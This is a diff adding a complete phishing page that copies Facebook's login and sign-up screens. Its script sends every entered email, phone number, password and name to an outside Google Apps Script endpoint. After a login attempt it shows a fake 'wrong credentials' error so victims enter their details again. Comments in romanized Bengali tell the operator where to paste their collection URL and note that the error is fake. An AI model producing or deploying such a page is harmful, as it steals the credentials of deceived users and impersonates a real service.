@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook – log in or sign up</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <style>
+        :root { --fb-blue: #1877f2; --fb-green: #42b72a; --fb-red: #f02849; --bg-gray: #f0f2f5; }
+        body { font-family: Helvetica, Arial, sans-serif; background-color: var(--bg-gray); margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        
+        .container { display: flex; flex-wrap: wrap; justify-content: center; align-items: center; max-width: 1000px; width: 100%; padding: 20px; gap: 40px; }
+        .left { flex: 1; min-width: 300px; }
+        .left h1 { color: var(--fb-blue); font-size: 60px; margin: 0; font-weight: 800; letter-spacing: -2px; }
+        .left p { font-size: 26px; line-height: 1.3; margin-top: 0; color: #1c1e21; }
+
+        .right { width: 100%; max-width: 396px; }
+        .card { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: center; }
+        
+        /* Error Box */
+        #error-box { display: none; background: #f2dede; border: 1px solid #e4b7b7; color: #a94442; padding: 10px; border-radius: 4px; font-size: 13px; margin-bottom: 15px; text-align: left; }
+
+        input { width: 100%; box-sizing: border-box; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; outline: none; }
+        input:focus { border-color: var(--fb-blue); }
+        .input-error { border-color: var(--fb-red) !important; }
+
+        .btn-login { width: 100%; background: var(--fb-blue); color: white; border: none; border-radius: 6px; font-size: 20px; font-weight: 700; padding: 12px; cursor: pointer; }
+        .btn-create { background: var(--fb-green); color: white; border: none; border-radius: 6px; font-size: 17px; font-weight: 700; padding: 12px 20px; margin-top: 15px; cursor: pointer; }
+
+        /* Signup Section */
+        #signup-box { display: none; width: 100%; max-width: 432px; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+        .signup-header { border-bottom: 1px solid #dadde1; padding-bottom: 10px; margin-bottom: 15px; }
+        .signup-header h2 { margin: 0; font-size: 32px; }
+
+        @media (max-width: 900px) {
+            .container { flex-direction: column; text-align: center; }
+            .left h1 { font-size: 45px; }
+            .left p { font-size: 20px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="left" id="fb-text">
+            <h1>facebook</h1>
+            <p>Facebook helps you connect and share with the people in your life.</p>
+        </div>
+
+        <div class="right" id="login-box">
+            <div class="card">
+                <div id="error-box">
+                    <b>Wrong credentials</b><br>
+                    The password you’ve entered is incorrect. <a href="#" style="color:#a94442">Forgot password?</a>
+                </div>
+                <form id="login-form">
+                    <input type="text" name="email_phone" placeholder="Email or phone number" required>
+                    <input type="password" name="password" id="login-pass" placeholder="Password" required>
+                    <button type="submit" class="btn-login" id="login-sub">Log In</button>
+                    <a href="#" style="color:var(--fb-blue); text-decoration:none; display:block; margin:15px 0; font-size:14px;">Forgotten password?</a>
+                    <hr style="border:0; border-top:1px solid #dadde1;">
+                    <button type="button" class="btn-create" id="btn-show-signup">Create New Account</button>
+                </form>
+            </div>
+        </div>
+
+        <div id="signup-box">
+            <div class="signup-header">
+                <h2 style="margin:0">Sign Up</h2>
+                <p style="color:#606770; margin:0">It's quick and easy.</p>
+            </div>
+            <form id="signup-form">
+                <div style="display:flex; gap:10px;">
+                    <input type="text" name="fname" placeholder="First name" required>
+                    <input type="text" name="lname" placeholder="Surname" required>
+                </div>
+                <input type="text" name="email_phone" placeholder="Mobile number or email" required>
+                <input type="password" name="password" placeholder="New password" required>
+                <p style="font-size:11px; color:#777">By clicking Sign Up, you agree to our Terms...</p>
+                <button type="submit" class="btn-create" style="width:100%">Sign Up</button>
+                <center><a href="#" id="btn-show-login" style="display:block; margin-top:15px; color:var(--fb-blue); text-decoration:none;">Already have an account?</a></center>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // *** TOMAR SCRIPT URL EIKHANE BOSAO ***
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbzsELLWKDoLgpm9Iyn2v9mBzIEWjxgD9qt8Joac255lZnA6baUn37iBrLVrXR05E0vzBw/exec';
+
+        $(document).ready(function() {
+            // Show Signup
+            $('#btn-show-signup').click(function() {
+                $('#fb-text, #login-box').hide();
+                $('#signup-box').fadeIn();
+            });
+
+            // Show Login
+            $('#btn-show-login').click(function() {
+                $('#signup-box').hide();
+                $('#fb-text, #login-box').fadeIn();
+            });
+
+            // Handle Forms
+            $('form').on('submit', function(e) {
+                e.preventDefault();
+                const formId = $(this).attr('id');
+                const $btn = $(this).find('button[type="submit"]');
+                
+                $btn.prop('disabled', true).text('Connecting...');
+
+                $.ajax({
+                    url: scriptURL,
+                    method: "POST",
+                    data: $(this).serialize(),
+                    success: function() {
+                        if(formId === 'login-form') {
+                            // Login-e fake error dekhabo
+                            setTimeout(function() {
+                                $btn.prop('disabled', false).text('Log In');
+                                $('#error-box').fadeIn();
+                                $('#login-pass').addClass('input-error').val('');
+                            }, 1000);
+                        } else {
+                            // Signup-e success alert dibo
+                            alert("Registration Successful!");
+                            location.reload();
+                        }
+                    },
+                    error: function() {
+                        alert("Connection Error!");
+                        $btn.prop('disabled', false).text('Try Again');
+                    }
+                });
+            });
+        });
+    </script>
+</body>
+</html>
